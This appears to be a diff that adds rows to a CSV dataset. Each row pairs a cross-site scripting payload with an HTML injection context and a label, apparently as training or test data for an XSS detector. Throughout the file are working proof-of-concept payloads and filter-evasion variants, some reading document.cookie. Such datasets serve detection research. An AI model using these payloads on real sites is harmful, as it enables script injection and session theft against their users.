+""";confirm(1);//",url_href,0,"CONTEXT_url_href "";confirm(1);//"
+""";prompt(1);//",html_text,0,"CONTEXT_html_text "";prompt(1);//"
+""";prompt(1);//",html_attribute,0,"CONTEXT_html_attribute "";prompt(1);//"
+""";prompt(1);//",html_tag,0,"CONTEXT_html_tag "";prompt(1);//"
+""";prompt(1);//",url_href,0,"CONTEXT_url_href "";prompt(1);//"
+""";alert(document.cookie);//",html_tag,0,"CONTEXT_html_tag "";alert(document.cookie);//"
+""";alert(document.cookie);//",html_text,0,"CONTEXT_html_text "";alert(document.cookie);//"
+""";alert(document.cookie);//",html_attribute,0,"CONTEXT_html_attribute "";alert(document.cookie);//"
+""";alert(document.cookie);//",url_href,0,"CONTEXT_url_href "";alert(document.cookie);//"
+""";alert(location);//",html_text,0,"CONTEXT_html_text "";alert(location);//"
+""";alert(location);//",html_attribute,0,"CONTEXT_html_attribute "";alert(location);//"
+""";alert(location);//",html_tag,0,"CONTEXT_html_tag "";alert(location);//"
+""";alert(window.origin);//",html_text,0,"CONTEXT_html_text "";alert(window.origin);//"
+""";alert(window.origin);//",html_tag,0,"CONTEXT_html_tag "";alert(window.origin);//"
+""";alert(window.origin);//",html_attribute,0,"CONTEXT_html_attribute "";alert(window.origin);//"
+</pre><marquee onstart=alert(1)>,html_tag,0,CONTEXT_html_tag </pre><marquee onstart=alert(1)>
+</pre><marquee onstart=alert(1)>,html_text,0,CONTEXT_html_text </pre><marquee onstart=alert(1)>
+</pre><marquee onstart=alert(1)>,html_attribute,0,CONTEXT_html_attribute </pre><marquee onstart=alert(1)>
+</pre><marquee onstart=alert(1)>,script_block,0,CONTEXT_script_block </pre><marquee onstart=alert(1)>
+;alert(navigator.userAgent);//,html_tag,0,CONTEXT_html_tag ;alert(navigator.userAgent);//
+;alert(navigator.userAgent);//,html_attribute,0,CONTEXT_html_attribute ;alert(navigator.userAgent);//
+;alert(navigator.userAgent);//,html_text,0,CONTEXT_html_text ;alert(navigator.userAgent);//
+;alert(navigator.userAgent);//,url_href,0,CONTEXT_url_href ;alert(navigator.userAgent);//
+;alert(document.title);//,html_text,0,CONTEXT_html_text ;alert(document.title);//
+;alert(document.title);//,html_tag,0,CONTEXT_html_tag ;alert(document.title);//
+;alert(document.title);//,html_attribute,0,CONTEXT_html_attribute ;alert(document.title);//
+;alert(document.title);//,url_href,0,CONTEXT_url_href ;alert(document.title);//
+;alert(history.length);//,html_text,0,CONTEXT_html_text ;alert(history.length);//
+;alert(history.length);//,html_attribute,0,CONTEXT_html_attribute ;alert(history.length);//
+;alert(history.length);//,html_tag,0,CONTEXT_html_tag ;alert(history.length);//
+;alert(history.length);//,url_href,0,CONTEXT_url_href ;alert(history.length);//
+"data:text/html,<script>alert(1)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>alert(1)</script>"
+"data:text/html,<script>alert(1)</script>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<script>alert(1)</script>"
+"data:text/html,<script>alert(1)</script>",html_tag,0,"CONTEXT_html_tag data:text/html,<script>alert(1)</script>"
+"data:text/html,<script>alert(1)</script>",script_block,0,"CONTEXT_script_block data:text/html,<script>alert(1)</script>"
+"data:text/html,<script>alert(1)</script>",url_href,0,"CONTEXT_url_href data:text/html,<script>alert(1)</script>"
+"data:text/html,<script>alert(document.domain)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>alert(document.domain)</script>"
+"data:text/html,<script>alert(document.domain)</script>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<script>alert(document.domain)</script>"
+"data:text/html,<script>alert(document.domain)</script>",html_tag,0,"CONTEXT_html_tag data:text/html,<script>alert(document.domain)</script>"
+"data:text/html,<script>alert(document.domain)</script>",url_href,0,"CONTEXT_url_href data:text/html,<script>alert(document.domain)</script>"
+"data:text/html,<script>alert(document.domain)</script>",script_block,0,"CONTEXT_script_block data:text/html,<script>alert(document.domain)</script>"
+"data:text/html,<img src=x onerror=alert(1)>",html_text,0,"CONTEXT_html_text data:text/html,<img src=x onerror=alert(1)>"
+"data:text/html,<img src=x onerror=alert(1)>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<img src=x onerror=alert(1)>"
+"data:text/html,<img src=x onerror=alert(1)>",html_tag,0,"CONTEXT_html_tag data:text/html,<img src=x onerror=alert(1)>"
+"data:text/html,<img src=x onerror=alert(1)>",script_block,0,"CONTEXT_script_block data:text/html,<img src=x onerror=alert(1)>"
+"data:text/html,<img src=x onerror=alert(1)>",url_href,0,"CONTEXT_url_href data:text/html,<img src=x onerror=alert(1)>"
+"data:text/html,<svg onload=alert(1)>",html_text,0,"CONTEXT_html_text data:text/html,<svg onload=alert(1)>"
+"data:text/html,<svg onload=alert(1)>",html_tag,0,"CONTEXT_html_tag data:text/html,<svg onload=alert(1)>"
+"data:text/html,<svg onload=alert(1)>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<svg onload=alert(1)>"
+"data:text/html,<svg onload=alert(1)>",script_block,0,"CONTEXT_script_block data:text/html,<svg onload=alert(1)>"
+"data:text/html,<svg onload=alert(1)>",url_href,0,"CONTEXT_url_href data:text/html,<svg onload=alert(1)>"
+"data:text/html,<script>confirm(1)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>confirm(1)</script>"
+"data:text/html,<script>confirm(1)</script>",html_tag,0,"CONTEXT_html_tag data:text/html,<script>confirm(1)</script>"
+"data:text/html,<script>confirm(1)</script>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<script>confirm(1)</script>"
+"data:text/html,<script>confirm(1)</script>",script_block,0,"CONTEXT_script_block data:text/html,<script>confirm(1)</script>"
+"data:text/html,<script>confirm(1)</script>",url_href,0,"CONTEXT_url_href data:text/html,<script>confirm(1)</script>"
+"data:text/html,<script>prompt(1)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>prompt(1)</script>"
+"data:text/html,<script>prompt(1)</script>",html_tag,0,"CONTEXT_html_tag data:text/html,<script>prompt(1)</script>"
+"data:text/html,<script>prompt(1)</script>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<script>prompt(1)</script>"
+"data:text/html,<script>prompt(1)</script>",script_block,0,"CONTEXT_script_block data:text/html,<script>prompt(1)</script>"
+"data:text/html,<script>prompt(1)</script>",url_href,0,"CONTEXT_url_href data:text/html,<script>prompt(1)</script>"
+"data:text/html,<script>alert(document.cookie)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>alert(document.cookie)</script>"
+"data:text/html,<script>alert(document.cookie)</script>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<script>alert(document.cookie)</script>"
+"data:text/html,<script>alert(document.cookie)</script>",html_tag,0,"CONTEXT_html_tag data:text/html,<script>alert(document.cookie)</script>"
+"data:text/html,<script>alert(document.cookie)</script>",script_block,0,"CONTEXT_script_block data:text/html,<script>alert(document.cookie)</script>"
+"data:text/html,<script>alert(document.cookie)</script>",url_href,0,"CONTEXT_url_href data:text/html,<script>alert(document.cookie)</script>"
+</pre><svg/onload=alert`1`>,html_text,0,CONTEXT_html_text </pre><svg/onload=alert`1`>
+</pre><svg/onload=alert`1`>,html_attribute,0,CONTEXT_html_attribute </pre><svg/onload=alert`1`>
+</pre><svg/onload=alert`1`>,script_block,0,CONTEXT_script_block </pre><svg/onload=alert`1`>
+</pre><svg/onload=alert`1`>,url_href,0,CONTEXT_url_href </pre><svg/onload=alert`1`>
+</pre><img src=x onerror=alert`1`>,html_text,0,CONTEXT_html_text </pre><img src=x onerror=alert`1`>
+</pre><img src=x onerror=alert`1`>,html_attribute,0,CONTEXT_html_attribute </pre><img src=x onerror=alert`1`>
+</pre><img src=x onerror=alert`1`>,script_block,0,CONTEXT_script_block </pre><img src=x onerror=alert`1`>
+</pre><img src=x onerror=alert`1`>,url_href,0,CONTEXT_url_href </pre><img src=x onerror=alert`1`>
+</pre><details open ontoggle=alert(1)>,html_text,0,CONTEXT_html_text </pre><details open ontoggle=alert(1)>
+</pre><details open ontoggle=alert(1)>,html_attribute,0,CONTEXT_html_attribute </pre><details open ontoggle=alert(1)>
+</pre><details open ontoggle=alert(1)>,script_block,0,CONTEXT_script_block </pre><details open ontoggle=alert(1)>
+</pre><details open ontoggle=alert(1)>,url_href,0,CONTEXT_url_href </pre><details open ontoggle=alert(1)>
+</pre><marquee onmouseover=alert(1)>hover me</marquee,html_text,0,CONTEXT_html_text </pre><marquee onmouseover=alert(1)>hover me</marquee
+</pre><marquee onmouseover=alert(1)>hover me</marquee,html_attribute,0,CONTEXT_html_attribute </pre><marquee onmouseover=alert(1)>hover me</marquee
+</pre><marquee onmouseover=alert(1)>hover me</marquee,script_block,0,CONTEXT_script_block </pre><marquee onmouseover=alert(1)>hover me</marquee
+</pre><marquee onmouseover=alert(1)>hover me</marquee,url_href,0,CONTEXT_url_href </pre><marquee onmouseover=alert(1)>hover me</marquee
+</pre><body onload=alert(1)>,html_text,0,CONTEXT_html_text </pre><body onload=alert(1)>
+</pre><body onload=alert(1)>,html_attribute,0,CONTEXT_html_attribute </pre><body onload=alert(1)>
+</pre><body onload=alert(1)>,script_block,0,CONTEXT_script_block </pre><body onload=alert(1)>
+</pre><body onload=alert(1)>,url_href,0,CONTEXT_url_href </pre><body onload=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>,html_text,0,CONTEXT_html_text <IMG SRC=x ONERROR=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>,html_attribute,0,CONTEXT_html_attribute <IMG SRC=x ONERROR=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>,script_block,0,CONTEXT_script_block <IMG SRC=x ONERROR=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>,url_href,0,CONTEXT_url_href <IMG SRC=x ONERROR=alert(1)>
+<svg OnLoAd=alert(1)>,html_text,0,CONTEXT_html_text <svg OnLoAd=alert(1)>
+<svg OnLoAd=alert(1)>,html_attribute,0,CONTEXT_html_attribute <svg OnLoAd=alert(1)>
+<svg OnLoAd=alert(1)>,script_block,0,CONTEXT_script_block <svg OnLoAd=alert(1)>
+<svg OnLoAd=alert(1)>,url_href,0,CONTEXT_url_href <svg OnLoAd=alert(1)>
+<svg/onload=alert(String.fromCharCode(49))>,html_text,0,CONTEXT_html_text <svg/onload=alert(String.fromCharCode(49))>
+<svg/onload=alert(String.fromCharCode(49))>,html_attribute,0,CONTEXT_html_attribute <svg/onload=alert(String.fromCharCode(49))>
+<svg/onload=alert(String.fromCharCode(49))>,script_block,0,CONTEXT_script_block <svg/onload=alert(String.fromCharCode(49))>
+<svg/onload=alert(String.fromCharCode(49))>,url_href,0,CONTEXT_url_href <svg/onload=alert(String.fromCharCode(49))>
+<img src=x onerror=alert&#40;1&#41;>,html_text,0,CONTEXT_html_text <img src=x onerror=alert&#40;1&#41;>
+<img src=x onerror=alert&#40;1&#41;>,html_attribute,0,CONTEXT_html_attribute <img src=x onerror=alert&#40;1&#41;>
+<img src=x onerror=alert&#40;1&#41;>,script_block,0,CONTEXT_script_block <img src=x onerror=alert&#40;1&#41;>
+<img src=x onerror=alert&#40;1&#41;>,url_href,0,CONTEXT_url_href <img src=x onerror=alert&#40;1&#41;>
+<img src=x onerror=alert&#x28;1&#x29;>,html_text,0,CONTEXT_html_text <img src=x onerror=alert&#x28;1&#x29;>
+<img src=x onerror=alert&#x28;1&#x29;>,html_attribute,0,CONTEXT_html_attribute <img src=x onerror=alert&#x28;1&#x29;>
+<img src=x onerror=alert&#x28;1&#x29;>,script_block,0,CONTEXT_script_block <img src=x onerror=alert&#x28;1&#x29;>
+<img src=x onerror=alert&#x28;1&#x29;>,url_href,0,CONTEXT_url_href <img src=x onerror=alert&#x28;1&#x29;>
+<svg/onload=alert(1)>,html_text,0,CONTEXT_html_text <svg/onload=alert(1)>
+<svg/onload=alert(1)>,html_attribute,0,CONTEXT_html_attribute <svg/onload=alert(1)>
+<svg/onload=alert(1)>,script_block,0,CONTEXT_script_block <svg/onload=alert(1)>
+<svg/onload=alert(1)>,url_href,0,CONTEXT_url_href <svg/onload=alert(1)>
+<svg/onload=alert`XSS`>,html_text,0,CONTEXT_html_text <svg/onload=alert`XSS`>
+<svg/onload=alert`XSS`>,html_attribute,0,CONTEXT_html_attribute <svg/onload=alert`XSS`>
+<svg/onload=alert`XSS`>,script_block,0,CONTEXT_script_block <svg/onload=alert`XSS`>
+<svg/onload=alert`XSS`>,url_href,0,CONTEXT_url_href <svg/onload=alert`XSS`>
+<img src=x onerror=alert(1)//>,html_text,0,CONTEXT_html_text <img src=x onerror=alert(1)//>
+<img src=x onerror=alert(1)//>,html_attribute,0,CONTEXT_html_attribute <img src=x onerror=alert(1)//>
+<img src=x onerror=alert(1)//>,script_block,0,CONTEXT_script_block <img src=x onerror=alert(1)//>
+<img src=x onerror=alert(1)//>,url_href,0,CONTEXT_url_href <img src=x onerror=alert(1)//>
+<img src=x onerror=alert(1)//,html_text,0,CONTEXT_html_text <img src=x onerror=alert(1)//
+<img src=x onerror=alert(1)//,html_attribute,0,CONTEXT_html_attribute <img src=x onerror=alert(1)//
+<img src=x onerror=alert(1)//,script_block,0,CONTEXT_script_block <img src=x onerror=alert(1)//
+<img src=x onerror=alert(1)//,url_href,0,CONTEXT_url_href <img src=x onerror=alert(1)//
+<svg/onload=confirm`1`>,html_text,0,CONTEXT_html_text <svg/onload=confirm`1`>
+<svg/onload=confirm`1`>,html_attribute,0,CONTEXT_html_attribute <svg/onload=confirm`1`>
+<svg/onload=confirm`1`>,script_block,0,CONTEXT_script_block <svg/onload=confirm`1`>
+<svg/onload=confirm`1`>,url_href,0,CONTEXT_url_href <svg/onload=confirm`1`>
+autofocus onfocus=alert(1) x=,html_text,0,CONTEXT_html_text autofocus onfocus=alert(1) x=
+autofocus onfocus=alert(1) x=,html_attribute,0,CONTEXT_html_attribute autofocus onfocus=alert(1) x=
+autofocus onfocus=alert(1) x=,script_block,0,CONTEXT_script_block autofocus onfocus=alert(1) x=
+autofocus onfocus=alert(1) x=,url_href,0,CONTEXT_url_href autofocus onfocus=alert(1) x=
+onpointerover=alert(1),html_text,0,CONTEXT_html_text onpointerover=alert(1)
+onpointerover=alert(1),html_attribute,0,CONTEXT_html_attribute onpointerover=alert(1)
+onpointerover=alert(1),url_href,0,CONTEXT_url_href onpointerover=alert(1)
+onpointerover=alert(1),script_block,0,CONTEXT_script_block onpointerover=alert(1)
+<meter onmouseover=alert(1)>,html_text,0,CONTEXT_html_text <meter onmouseover=alert(1)>
+<meter onmouseover=alert(1)>,html_attribute,0,CONTEXT_html_attribute <meter onmouseover=alert(1)>
+<meter onmouseover=alert(1)>,script_block,0,CONTEXT_script_block <meter onmouseover=alert(1)>
+<meter onmouseover=alert(1)>,url_href,0,CONTEXT_url_href <meter onmouseover=alert(1)>
+"<iframe srcdoc=""<script>alert(1)</script>"">",html_text,0,"CONTEXT_html_text <iframe srcdoc=""<script>alert(1)</script>"">"
+"<iframe srcdoc=""<script>alert(1)</script>"">",html_attribute,0,"CONTEXT_html_attribute <iframe srcdoc=""<script>alert(1)</script>"">"
+"<iframe srcdoc=""<script>alert(1)</script>"">",script_block,0,"CONTEXT_script_block <iframe srcdoc=""<script>alert(1)</script>"">"
+"<iframe srcdoc=""<script>alert(1)</script>"">",url_href,0,"CONTEXT_url_href <iframe srcdoc=""<script>alert(1)</script>"">"
+<iframe src=javascript:alert(1)>,html_text,0,CONTEXT_html_text <iframe src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>,html_attribute,0,CONTEXT_html_attribute <iframe src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>,script_block,0,CONTEXT_script_block <iframe src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>,url_href,0,CONTEXT_url_href <iframe src=javascript:alert(1)>
+"<iframe src=""data:text/html,<script>alert(1)</script>"">",html_text,0,"CONTEXT_html_text <iframe src=""data:text/html,<script>alert(1)</script>"">"
+"<iframe src=""data:text/html,<script>alert(1)</script>"">",html_attribute,0,"CONTEXT_html_attribute <iframe src=""data:text/html,<script>alert(1)</script>"">"
+"<iframe src=""data:text/html,<script>alert(1)</script>"">",script_block,0,"CONTEXT_script_block <iframe src=""data:text/html,<script>alert(1)</script>"">"
+"<iframe src=""data:text/html,<script>alert(1)</script>"">",url_href,0,"CONTEXT_url_href <iframe src=""data:text/html,<script>alert(1)</script>"">"
+"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_text,0,"CONTEXT_html_text <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
+"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_attribute,0,"CONTEXT_html_attribute <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
+"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",script_block,0,"CONTEXT_script_block <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
+"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",url_href,0,"CONTEXT_url_href <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
+"<iframe srcdoc=""<svg onload=alert(1)>"">",html_text,0,"CONTEXT_html_text <iframe srcdoc=""<svg onload=alert(1)>"">"
+"<iframe srcdoc=""<svg onload=alert(1)>"">",html_attribute,0,"CONTEXT_html_attribute <iframe srcdoc=""<svg onload=alert(1)>"">"
+"<iframe srcdoc=""<svg onload=alert(1)>"">",script_block,0,"CONTEXT_script_block <iframe srcdoc=""<svg onload=alert(1)>"">"
+"<iframe srcdoc=""<svg onload=alert(1)>"">",url_href,0,"CONTEXT_url_href <iframe srcdoc=""<svg onload=alert(1)>"">"
+><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text ><svg/onload=alert(1)>
+><svg/onload=alert(1)>,script_block,0,CONTEXT_script_block ><svg/onload=alert(1)>
+><svg/onload=alert(1)>,url_href,0,CONTEXT_url_href ><svg/onload=alert(1)>
+><img src=x onerror=alert(1)>,html_text,0,CONTEXT_html_text ><img src=x onerror=alert(1)>
+><img src=x onerror=alert(1)>,script_block,0,CONTEXT_script_block ><img src=x onerror=alert(1)>
+><img src=x onerror=alert(1)>,url_href,0,CONTEXT_url_href ><img src=x onerror=alert(1)>
+</script><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text </script><svg/onload=alert(1)>
+</script><svg/onload=alert(1)>,html_attribute,0,CONTEXT_html_attribute </script><svg/onload=alert(1)>
+</script><svg/onload=alert(1)>,url_href,0,CONTEXT_url_href </script><svg/onload=alert(1)>
+</title><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text </title><svg/onload=alert(1)>
+</title><svg/onload=alert(1)>,html_attribute,0,CONTEXT_html_attribute </title><svg/onload=alert(1)>
+</title><svg/onload=alert(1)>,script_block,0,CONTEXT_script_block </title><svg/onload=alert(1)>
+</title><svg/onload=alert(1)>,url_href,0,CONTEXT_url_href </title><svg/onload=alert(1)>
+</textarea><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text </textarea><svg/onload=alert(1)>
+</textarea><svg/onload=alert(1)>,html_attribute,0,CONTEXT_html_attribute </textarea><svg/onload=alert(1)>
+</textarea><svg/onload=alert(1)>,script_block,0,CONTEXT_script_block </textarea><svg/onload=alert(1)>
+</textarea><svg/onload=alert(1)>,url_href,0,CONTEXT_url_href </textarea><svg/onload=alert(1)>
+javascript:alert`1`,html_text,0,CONTEXT_html_text javascript:alert`1`
+javascript:alert`1`,html_attribute,0,CONTEXT_html_attribute javascript:alert`1`
+javascript:alert`1`,html_tag,0,CONTEXT_html_tag javascript:alert`1`
+javascript:alert`1`,script_block,0,CONTEXT_script_block javascript:alert`1`
+javascript:alert(String.fromCharCode(49)),html_text,0,CONTEXT_html_text javascript:alert(String.fromCharCode(49))
+javascript:alert(String.fromCharCode(49)),html_tag,0,CONTEXT_html_tag javascript:alert(String.fromCharCode(49))
+javascript:alert(String.fromCharCode(49)),html_attribute,0,CONTEXT_html_attribute javascript:alert(String.fromCharCode(49))
+javascript:alert(String.fromCharCode(49)),script_block,0,CONTEXT_script_block javascript:alert(String.fromCharCode(49))
+javascript:confirm`1`,html_text,0,CONTEXT_html_text javascript:confirm`1`
+javascript:confirm`1`,html_tag,0,CONTEXT_html_tag javascript:confirm`1`
+javascript:confirm`1`,html_attribute,0,CONTEXT_html_attribute javascript:confirm`1`
+javascript:confirm`1`,script_block,0,CONTEXT_script_block javascript:confirm`1`
+javascript:prompt`1`,html_text,0,CONTEXT_html_text javascript:prompt`1`
+javascript:prompt`1`,html_attribute,0,CONTEXT_html_attribute javascript:prompt`1`
+javascript:prompt`1`,html_tag,0,CONTEXT_html_tag javascript:prompt`1`
+javascript:prompt`1`,script_block,0,CONTEXT_script_block javascript:prompt`1`
+"data:text/html,<svg/onload=alert(1)>",html_text,0,"CONTEXT_html_text data:text/html,<svg/onload=alert(1)>"
+"data:text/html,<svg/onload=alert(1)>",html_attribute,0,"CONTEXT_html_attribute data:text/html,<svg/onload=alert(1)>"
+"data:text/html,<svg/onload=alert(1)>",html_tag,0,"CONTEXT_html_tag data:text/html,<svg/onload=alert(1)>"
+"data:text/html,<svg/onload=alert(1)>",script_block,0,"CONTEXT_script_block data:text/html,<svg/onload=alert(1)>"
+"data:text/html,<svg/onload=alert(1)>",url_href,0,"CONTEXT_url_href data:text/html,<svg/onload=alert(1)>"
+onblur=alert(1),html_text,0,CONTEXT_html_text onblur=alert(1)
+onblur=alert(1),html_tag,0,CONTEXT_html_tag onblur=alert(1)
+onblur=alert(1),script_block,0,CONTEXT_script_block onblur=alert(1)
+onblur=alert(1),url_href,0,CONTEXT_url_href onblur=alert(1)
+""" onfocus=alert(1) autofocus """,html_text,0,"CONTEXT_html_text "" onfocus=alert(1) autofocus """
+""" onfocus=alert(1) autofocus """,html_tag,0,"CONTEXT_html_tag "" onfocus=alert(1) autofocus """
+""" onfocus=alert(1) autofocus """,script_block,0,"CONTEXT_script_block "" onfocus=alert(1) autofocus """
+""" onfocus=alert(1) autofocus """,url_href,0,"CONTEXT_url_href "" onfocus=alert(1) autofocus """
+<source onerror=alert(1)>,html_text,0,CONTEXT_html_text <source onerror=alert(1)>
+<source onerror=alert(1)>,script_block,0,CONTEXT_script_block <source onerror=alert(1)>
+<source onerror=alert(1)>,html_attribute,0,CONTEXT_html_attribute <source onerror=alert(1)>
+<source onerror=alert(1)>,url_href,0,CONTEXT_url_href <source onerror=alert(1)>
+javascript:prompt(1),html_text,0,CONTEXT_html_text javascript:prompt(1)
+javascript:prompt(1),html_tag,0,CONTEXT_html_tag javascript:prompt(1)
+javascript:prompt(1),html_attribute,0,CONTEXT_html_attribute javascript:prompt(1)
+javascript:prompt(1),script_block,0,CONTEXT_script_block javascript:prompt(1)
+javascript:confirm(1),html_text,0,CONTEXT_html_text javascript:confirm(1)
+javascript:confirm(1),html_tag,0,CONTEXT_html_tag javascript:confirm(1)
+javascript:confirm(1),html_attribute,0,CONTEXT_html_attribute javascript:confirm(1)
+javascript:confirm(1),script_block,0,CONTEXT_script_block javascript:confirm(1)
